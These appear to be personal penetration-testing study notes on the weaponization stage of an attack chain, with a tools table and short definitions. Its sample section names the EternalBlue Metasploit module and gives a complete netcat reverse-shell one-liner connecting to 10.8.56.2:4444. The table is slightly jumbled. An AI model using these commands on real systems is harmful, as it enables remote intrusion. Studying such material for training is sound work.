
# 2-Weaponization

```
    INPUT             |      PROCESS                 |       TOOLS                           |      OUTPUT
----------------------|------------------------------|---------------------------------------|------------------
    Information       |     Creation of Weapon       |       Vulnerability Repositories      |      Weapon
    Network map       |                              |       Development                     |      
        IPs           |                              |       msfconsole                      |
        Ports         |                              |       msfvenom                        |
        Services      |3-Delivery
        Firewalls     |
        Users         |
    Vulnerability     |            
```                                                
                                                    
[Weapon]             [Exploit]        An exploit is a code that is written to take advantage of a specific Vulnerability in a system.
                     [Payload]        Payload is the code that actually does something.    
                        [RS]         Reverse Shell that need 
                        [Malware]    Malicious Software
[Msfvenom]           Standalone payload generator
[Windows]            Weapon types: WSH, HTA, VBA, PSH


# Sample

- ms17-010 [CVE-2017-0143]
    - TOOLS       msfconsole     
    - Exploit     exploit/windows/smb/ms17_010_eternalblue 
    - Payload     windows/x64/shell/reverse_tcp
- Online Book Store 1.0 - Unauthenticated Remote Code Execution
    - TOOLS       Python   
    - Exploit     https://www.exploit-db.com/exploits/47887  
    - Payload     rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.56.2 4444 > /tmp/f